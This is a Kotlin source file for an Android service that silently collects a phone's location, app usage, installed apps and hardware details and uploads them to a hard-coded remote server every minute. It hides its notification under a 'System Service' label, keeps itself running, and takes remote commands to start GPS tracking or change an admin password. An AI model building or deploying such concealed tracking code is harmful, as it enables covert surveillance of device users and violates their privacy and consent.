package com.xlx.monitor

import android.annotation.SuppressLint
import android.app.*
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.IBinder
import android.os.PowerManager
import android.os.StatFs
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import com.xlx.monitor.api.NetworkManager
import com.xlx.monitor.data.AppInfo
import com.xlx.monitor.data.InstalledAppsData
import com.xlx.monitor.data.MonitorData
import com.xlx.monitor.data.ApiResponse
import com.xlx.monitor.data.DeviceConfig
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.File
import java.io.FileReader

import android.app.usage.StorageStatsManager
import android.app.usage.NetworkStats
import android.app.usage.NetworkStatsManager
import android.net.ConnectivityManager
import android.os.Process
import java.io.IOException

class MonitorService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var isRunning = false
    
    // Config
    private var uploadInterval: Long = 60000
    private var gpsEnabled: Boolean = false
    
    // GPS
    private var locationManager: LocationManager? = null
    private var lastLocation: Location? = null
    private var isGpsRunning = false
    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            lastLocation = location
        }
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundService()
        if (!isRunning) {
            isRunning = true
            requestIgnoreBatteryOptimizations()
            initLocation()
            startMonitoring()
            // 启动时上传一次已安装应用
            scope.launch {
                delay(5000)
                uploadInstalledApps()
            }
        }
        return START_STICKY
    }
    
    @SuppressLint("BatteryLife")
    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
            } catch (e: Exception) {
                Log.e("Monitor", "Ignore battery optimization failed: ${e.message}")
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun initLocation() {
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            // 尝试获取一次最后已知位置
            val providers = locationManager?.getProviders(true) ?: emptyList()
            for (provider in providers) {
                val l = locationManager?.getLastKnownLocation(provider)
                if (l != null) {
                    if (lastLocation == null || l.time > lastLocation!!.time) {
                        lastLocation = l
                    }
                }
            }
            
            // 默认开启定位 (或根据本地配置)
            // startLocationUpdates()
        } catch (e: Exception) {
            Log.e("Monitor", "Location init failed: ${e.message}")
        }
    }
    
    @SuppressLint("MissingPermission")
    private fun startLocationUpdates() {
        if (isGpsRunning) return
        if (locationManager == null) return
        try {
            // 注册监听 (Network provider 省电且室内可用)
            if (locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true) {
                locationManager?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10f, locationListener)
            }
            if (locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true) {
                locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10f, locationListener)
            }
            isGpsRunning = true
            broadcastLog("GPS 定位已开启", true)
        } catch (e: Exception) {
             Log.e("Monitor", "Start location failed: ${e.message}")
        }
    }
    
    private fun stopLocationUpdates() {
        if (!isGpsRunning) return
        locationManager?.removeUpdates(locationListener)
        isGpsRunning = false
        broadcastLog("GPS 定位已关闭", true)
    }

    private fun startForegroundService() {
        // 创建通知渠道，但设置重要性为 MIN，尽量不打扰用户
        val channelId = "MonitorServiceChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Service", 
                NotificationManager.IMPORTANCE_MIN 
            )
            channel.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.sym_def_app_icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(1, notification)
        
        // 按照用户要求，不显示常驻通知
        // 注意：这可能会导致服务在后台被杀，但符合用户"不显示"的需求
        stopForeground(true) 
    }

    private fun startMonitoring() {
        scope.launch {
            while (isActive) {
                try {
                    val data = collectData()
                    uploadData(data)
                    
                    // 根据服务端配置调整 GPS
                    withContext(Dispatchers.Main) {
                        if (gpsEnabled) {
                            startLocationUpdates()
                        } else {
                            stopLocationUpdates()
                        }
                    }
                } catch (e: Exception) {
                    Log.e("Monitor", "Error: ${e.message}")
                    broadcastLog("上传失败: ${e.message}", false)
                }
                delay(uploadInterval)
            }
        }
    }

    private suspend fun collectData(): MonitorData {
        // 1. RAM
        val actManager = getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val memInfo = ActivityManager.MemoryInfo()
        actManager.getMemoryInfo(memInfo)
        val ramUsage = ((memInfo.totalMem - memInfo.availMem).toFloat() / memInfo.totalMem) * 100
        val ramTotal = memInfo.totalMem
        val ramUsed = memInfo.totalMem - memInfo.availMem

        // 2. Storage
        val stat = StatFs(Environment.getDataDirectory().path)
        val bytesTotal = stat.totalBytes
        val bytesAvailable = stat.availableBytes
        val storageUsage = ((bytesTotal - bytesAvailable).toFloat() / bytesTotal) * 100
        val storageTotal = bytesTotal
        val storageUsed = bytesTotal - bytesAvailable

        // 3. Battery Temp & Level
        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val rawTemp = batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
        val batteryTemp = rawTemp / 10.0f
        
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryLevel = if (level != -1 && scale != -1) {
            (level.toFloat() / scale.toFloat() * 100).toInt()
        } else {
            0
        }

        // 4. CPU Temp (尝试读取)
        val cpuTemp = getCpuTemp()

        // 5. Running Apps
        val apps = getRunningApps()

        // 6. ID & Device Info
        val imei = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
        val model = Build.MODEL
        val manufacturer = Build.MANUFACTURER
        val androidVersion = Build.VERSION.RELEASE
        val sdkVersion = Build.VERSION.SDK_INT
        
        // 7. GPS
        val lat = lastLocation?.latitude
        val lng = lastLocation?.longitude
        
        // 8. Network Type
        val networkType = getNetworkType()

        return MonitorData(
            imei = imei,
            model = model,
            manufacturer = manufacturer,
            androidVersion = androidVersion,
            sdkVersion = sdkVersion,
            ram = ramUsage,
            storage = storageUsage,
            ramTotal = ramTotal,
            ramUsed = ramUsed,
            storageTotal = storageTotal,
            storageUsed = storageUsed,
            cpuTemp = cpuTemp,
            batteryTemp = batteryTemp,
            batteryLevel = batteryLevel,
            gpsLat = lat,
            gpsLng = lng,
            networkType = networkType,
            apps = apps
        )
    }
    
    private fun getNetworkType(): String {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork ?: return "None"
            val capabilities = cm.getNetworkCapabilities(network) ?: return "None"
            return when {
                capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile"
                capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                else -> "Unknown"
            }
        } else {
            val activeNetwork = cm.activeNetworkInfo
            return when (activeNetwork?.type) {
                ConnectivityManager.TYPE_WIFI -> "WiFi"
                ConnectivityManager.TYPE_MOBILE -> "Mobile"
                ConnectivityManager.TYPE_ETHERNET -> "Ethernet"
                else -> if (activeNetwork?.isConnected == true) "Unknown" else "None"
            }
        }
    }

    private fun getCpuTemp(): Float {
        // 尝试常见路径
        val paths = listOf(
            "/sys/class/thermal/thermal_zone0/temp",
            "/sys/devices/virtual/thermal/thermal_zone0/temp"
        )
        for (path in paths) {
            try {
                val file = File(path)
                if (file.exists()) {
                    val reader = BufferedReader(FileReader(file))
                    val line = reader.readLine()
                    reader.close()
                    if (line != null) {
                        return line.toFloat() / 1000.0f
                    }
                }
            } catch (e: Exception) {
                // ignore
            }
        }
        return 0f
    }

    @SuppressLint("MissingPermission")
    private fun getRunningApps(): List<AppInfo> {
        val apps = mutableListOf<AppInfo>()
        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val nsm = getSystemService(Context.NETWORK_STATS_SERVICE) as NetworkStatsManager
        val ssm = getSystemService(Context.STORAGE_STATS_SERVICE) as StorageStatsManager
        val pm = packageManager
        
        val time = System.currentTimeMillis()
        val cal = java.util.Calendar.getInstance()
        cal.set(java.util.Calendar.HOUR_OF_DAY, 0)
        cal.set(java.util.Calendar.MINUTE, 0)
        cal.set(java.util.Calendar.SECOND, 0)
        cal.set(java.util.Calendar.MILLISECOND, 0)
        val todayStart = cal.timeInMillis
        val yesterdayStart = todayStart - 86400000
        
        // 获取今天的应用使用情况 (从今天0点开始)
        val todayStatsMap = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, todayStart, time)?.associateBy { it.packageName } ?: emptyMap()
        
        // 获取昨天的应用使用情况
        val yesterdayStatsMap = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, yesterdayStart, todayStart)?.associateBy { it.packageName } ?: emptyMap()
        
        // 使用过去24小时作为活跃判断基准
        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 86400000, time)

        if (stats != null && stats.isNotEmpty()) {
            for (usageStats in stats) {
                // 上传最近10分钟内活跃的应用
                if (usageStats.lastTimeUsed > time - 600000) { 
                    try {
                        val appInfo = pm.getApplicationInfo(usageStats.packageName, 0)
                        // 排除系统应用，但保留用户安装的应用
                        if ((appInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0 || (appInfo.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
                            val name = pm.getApplicationLabel(appInfo).toString()
                            
                            // 获取流量 (Today)
                            var rxBytes = 0L
                            var txBytes = 0L
                            try {
                                val uid = appInfo.uid
                                val networkStats = nsm.queryDetailsForUid(
                                    ConnectivityManager.TYPE_WIFI,
                                    null,
                                    todayStart,
                                    time,
                                    uid
                                )
                                // Accumulate
                                var bucket = NetworkStats.Bucket()
                                while (networkStats.hasNextBucket()) {
                                    networkStats.getNextBucket(bucket)
                                    rxBytes += bucket.rxBytes
                                    txBytes += bucket.txBytes
                                }
                                networkStats.close()
                                
                                // Also check Mobile data
                                val mobileStats = nsm.queryDetailsForUid(
                                    ConnectivityManager.TYPE_MOBILE,
                                    null,
                                    todayStart,
                                    time,
                                    uid
                                )
                                while (mobileStats.hasNextBucket()) {
                                    mobileStats.getNextBucket(bucket)
                                    rxBytes += bucket.rxBytes
                                    txBytes += bucket.txBytes
                                }
                                mobileStats.close()
                                
                            } catch (e: Exception) {
                                // e.printStackTrace()
                            }
                            
                            // 获取存储占用
                            var storageBytes = 0L
                            try {
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                                    val userHandle = Process.myUserHandle()
                                    val storageStats = ssm.queryStatsForPackage(
                                        android.os.storage.StorageManager.UUID_DEFAULT, 
                                        usageStats.packageName, 
                                        userHandle
                                    )
                                    storageBytes = storageStats.appBytes + storageStats.dataBytes + storageStats.cacheBytes
                                }
                            } catch (e: Exception) {
                                // e.printStackTrace()
                            }
                            
                            // 获取昨日时长
                            val yesterdayTime = yesterdayStatsMap[usageStats.packageName]?.totalTimeInForeground ?: 0L
                            // 获取今日时长 (准确值)
                            val todayTime = todayStatsMap[usageStats.packageName]?.totalTimeInForeground ?: usageStats.totalTimeInForeground

                            apps.add(AppInfo(
                                name = name, 
                                packageName = usageStats.packageName,
                                lastTimeUsed = usageStats.lastTimeUsed,
                                totalTimeInForeground = todayTime,
                                yesterdayTimeInForeground = yesterdayTime,
                                trafficRx = rxBytes,
                                trafficTx = txBytes,
                                storageUsage = storageBytes
                            ))
                        }
                    } catch (e: PackageManager.NameNotFoundException) {
                        // ignore
                    }
                }
            }
        }
        return apps
    }
    
    private suspend fun uploadInstalledApps() {
        val pm = packageManager
        val installedPackages = pm.getInstalledPackages(0)
        val appList = mutableListOf<com.xlx.monitor.data.InstalledAppInfo>()
        val ssm = getSystemService(Context.STORAGE_STATS_SERVICE) as StorageStatsManager
        
        for (pkg in installedPackages) {
             if ((pkg.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0 || (pkg.applicationInfo.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
                 val name = pm.getApplicationLabel(pkg.applicationInfo).toString()
                 var size = 0L
                 
                 // Get Size
                 try {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        val userHandle = Process.myUserHandle()
                        val storageStats = ssm.queryStatsForPackage(
                            android.os.storage.StorageManager.UUID_DEFAULT, 
                            pkg.packageName, 
                            userHandle
                        )
                        size = storageStats.appBytes + storageStats.dataBytes + storageStats.cacheBytes
                    } else {
                        size = java.io.File(pkg.applicationInfo.sourceDir).length()
                    }
                 } catch (e: Exception) {
                     // ignore
                 }
                 
                 appList.add(com.xlx.monitor.data.InstalledAppInfo(name, pkg.packageName, size))
             }
        }
        
        val imei = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
        val data = InstalledAppsData(imei, appList)
        
        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        val url = prefs.getString("server_url", "http://1000.2016xlx.cn:3000/") ?: "http://1000.2016xlx.cn:3000/"
        
        try {
            val service = NetworkManager.getService(url)
            val response = service.uploadInstalledApps(data)
            if (response.isSuccessful) {
                broadcastLog("应用列表上传成功", true)
            } else {
                broadcastLog("应用列表上传失败: ${response.code()}", false)
            }
        } catch (e: Exception) {
             broadcastLog("应用列表上传异常: ${e.message}", false)
        }
    }

    private suspend fun uploadData(data: MonitorData) {
        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        val url = prefs.getString("server_url", "http://1000.2016xlx.cn:3000/") ?: "http://1000.2016xlx.cn:3000/"
        
        try {
            val start = System.currentTimeMillis()
            val service = NetworkManager.getService(url)
            val response = service.uploadData(data)
            val end = System.currentTimeMillis()
            
            // 处理指令和配置
            if (response.isSuccessful) {
                val body = response.body()
                
                // 解析配置
                body?.config?.let { config ->
                    if (config.uploadInterval != null && config.uploadInterval >= 1000) {
                        uploadInterval = config.uploadInterval
                    }
                    if (config.gpsEnabled != null) {
                        gpsEnabled = config.gpsEnabled
                    }
                }

                if (body?.command == "refresh_apps") {
                    scope.launch { uploadInstalledApps() }
                } else if (body?.command == "gps_start") {
                    gpsEnabled = true
                    scope.launch(Dispatchers.Main) { startLocationUpdates() }
                } else if (body?.command == "gps_stop") {
                    gpsEnabled = false
                    scope.launch(Dispatchers.Main) { stopLocationUpdates() }
                } else if (body?.command?.startsWith("set_pass:") == true) {
                    val newPass = body.command.substringAfter("set_pass:")
                    if (newPass.isNotEmpty()) {
                        prefs.edit().putString("admin_password", newPass).apply()
                        broadcastLog("管理员密码已更新", true)
                    }
                }
                broadcastLog("数据上传成功 (延迟: ${end-start}ms)", true)
            } else {
                broadcastLog("数据上传失败: ${response.code()}", false)
            }
            
            // 发送广播更新延迟 (兼容旧逻辑)
            val intent = Intent("UPDATE_LATENCY")
            intent.putExtra("latency", end - start)
            intent.putExtra("success", response.isSuccessful)
            sendBroadcast(intent)
            
        } catch (e: Exception) {
            Log.e("Upload", "Failed: ${e.message}")
            broadcastLog("连接异常: ${e.message}", false)
            
            val intent = Intent("UPDATE_LATENCY")
            intent.putExtra("latency", -1L)
            intent.putExtra("success", false)
            sendBroadcast(intent)
        }
    }
    
    private fun broadcastLog(msg: String, success: Boolean) {
        val intent = Intent("MONITOR_LOG")
        // 添加更多系统状态信息
        val memInfo = ActivityManager.MemoryInfo()
        (getSystemService(ACTIVITY_SERVICE) as ActivityManager).getMemoryInfo(memInfo)
        val availMem = memInfo.availMem / 1024 / 1024
        
        intent.putExtra("message", "$msg [FreeMem:${availMem}MB]")
        intent.putExtra("success", success)
        intent.putExtra("time", System.currentTimeMillis())
        sendBroadcast(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        locationManager?.removeUpdates(locationListener)
    }
}
